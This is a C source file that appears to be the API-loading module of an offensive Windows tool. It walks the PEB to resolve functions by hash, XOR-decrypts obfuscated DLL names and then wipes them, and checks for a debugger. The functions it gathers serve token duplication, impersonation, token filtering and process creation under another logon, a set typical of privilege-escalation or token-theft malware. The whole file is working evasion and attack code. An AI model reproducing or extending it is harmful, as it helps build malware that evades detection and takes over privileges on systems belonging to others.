#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"
#include "LoadAPI.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);
	Shell32_API* Shell32Api = &(APICall->Shell32Api);
	ntdll_API* ntdllApi = &(APICall->ntdllApi);

	char Advapi32DllStr[] = "\x2F\x3D\x04\x04\x4F\x28\x61\x60\x65\x1D\x4D\x0F\x74";
	char Shell32DllStr[] = "\x3D\x30\x5A\x3A\x18\x14\x54\x5F\x07\x5E\x2B\x52";
	char ntdllDllStr[] = "\x3D\x02\x43\x55\x3E\x42\x5B\x40\x22\x6D";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("[X] Debugger Detected !!!\n");
	//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(Advapi32DllStr,13,"\x6E\x59\x72\x65\x3F\x41\x52\x52\x4B\x79\x21\x63\x74");
	decryptionRoutine(Shell32DllStr,12,"\x6E\x58\x3F\x56\x74\x27\x66\x71\x63\x32\x47\x52");
	decryptionRoutine(ntdllDllStr,10,"\x53\x76\x27\x39\x52\x6C\x3F\x2C\x4E\x6D");


	Kernel32Api->TerminateProcessF = (TerminateProcess_F)find_api(pPeb,hash_kernel32_dll, 0xd1a71e59);
	if(Kernel32Api->TerminateProcessF == NULL)
		return FALSE;

	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
		const DWORD Advapi32Hash = 0x35c841f5;
		memset(Advapi32DllStr,0x00,13);
		Advapi32Api->AllocateAndInitializeSidF = (AllocateAndInitializeSid_F)find_api(pPeb,Advapi32Hash, 0x4f018f3);
		Advapi32Api->CheckTokenMembershipF = (CheckTokenMembership_F)find_api(pPeb,Advapi32Hash, 0xe4c51184);
		Advapi32Api->FreeSidF = (FreeSid_F)find_api(pPeb,Advapi32Hash, 0x9543e245);
		Advapi32Api->OpenProcessTokenF = (OpenProcessToken_F)find_api(pPeb,Advapi32Hash, 0x4296f923);
		Advapi32Api->DuplicateTokenExF = (DuplicateTokenEx_F)find_api(pPeb,Advapi32Hash, 0xcca86c7e);
		Advapi32Api->ImpersonateLoggedOnUserF = (ImpersonateLoggedOnUser_F)find_api(pPeb,Advapi32Hash, 0x5d18dd4a);
		Advapi32Api->CreateProcessWithLogonWF = (CreateProcessWithLogonW_F)find_api(pPeb,Advapi32Hash, 0xae64339e);
		Advapi32Api->CreateWellKnownSidF = (CreateWellKnownSid_F)find_api(pPeb,Advapi32Hash, 0x1db4cf8c);
		Advapi32Api->GetTokenInformationF = (GetTokenInformation_F)find_api(pPeb,Advapi32Hash, 0xea1753ba);
		Advapi32Api->DuplicateTokenF = (DuplicateToken_F)find_api(pPeb,Advapi32Hash, 0xf7b60aa3);
		if(Advapi32Api->AllocateAndInitializeSidF == NULL ||Advapi32Api->CheckTokenMembershipF == NULL ||Advapi32Api->FreeSidF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->DuplicateTokenExF == NULL ||Advapi32Api->ImpersonateLoggedOnUserF == NULL ||Advapi32Api->CreateProcessWithLogonWF == NULL ||Advapi32Api->CreateWellKnownSidF == NULL ||Advapi32Api->GetTokenInformationF == NULL ||Advapi32Api->DuplicateTokenF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(Shell32DllStr) != NULL) {
		const DWORD Shell32Hash = 0x1d89f936;
		memset(Shell32DllStr,0x00,12);
		Shell32Api->ShellExecuteExAF = (ShellExecuteExA_F)find_api(pPeb,Shell32Hash, 0x8952e090);
		if(Shell32Api->ShellExecuteExAF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(ntdllDllStr) != NULL) {
		const DWORD ntdllHash = 0x145370bb;
		memset(ntdllDllStr,0x00,10);
		ntdllApi->NtSetInformationTokenF = (NtSetInformationToken_F)find_api(pPeb,ntdllHash, 0x6e279bc2);
		ntdllApi->NtFilterTokenF = (NtFilterToken_F)find_api(pPeb,ntdllHash, 0xd108044e);
		if(ntdllApi->NtSetInformationTokenF == NULL ||ntdllApi->NtFilterTokenF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
